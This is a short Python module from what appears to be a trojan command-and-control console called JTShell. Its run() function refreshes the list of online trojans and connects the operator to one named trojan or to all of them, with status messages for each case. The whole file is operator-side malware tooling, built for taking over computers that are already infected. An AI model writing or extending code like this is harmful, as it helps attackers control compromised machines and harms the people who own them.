__author__ = 'Jonas'
from util import isip
from util import shellprint
from trojanshell import TrojanShell
from JTShell.util.message import Message
from JTShell.util.error import ProcessError



# ! implement list support
def run(process, std="127.0.0.1", list=None, info=True):
    """
    pass
    :param process:
    :param std:
    :return:
    """
    shell = process.shell
    connected_trojans = 0
    # updating the list of online trojans
    shell.client.update()
    if std == "all":
        for name in shell.client.available:
            shell.client.add(name)
            connected_trojans += 1
    else:
        # checking wether the requested name is even online
        if std in shell.client.available:
            shell.client.add(std)
            connected_trojans = 1
        else:
            return "the given name {0} is not in the list of currently online trojans".format(std)

    # giving the respoonse to the shell
    if connected_trojans == 0:
        raise ProcessError("No Trojan has been connected")
    elif connected_trojans == 1:
        return "succesfully connected the Trojan {0}".format(shell.client.cache[0])
    elif connected_trojans > 1:
        return "successfully connected {0} Trojans".format(connected_trojans)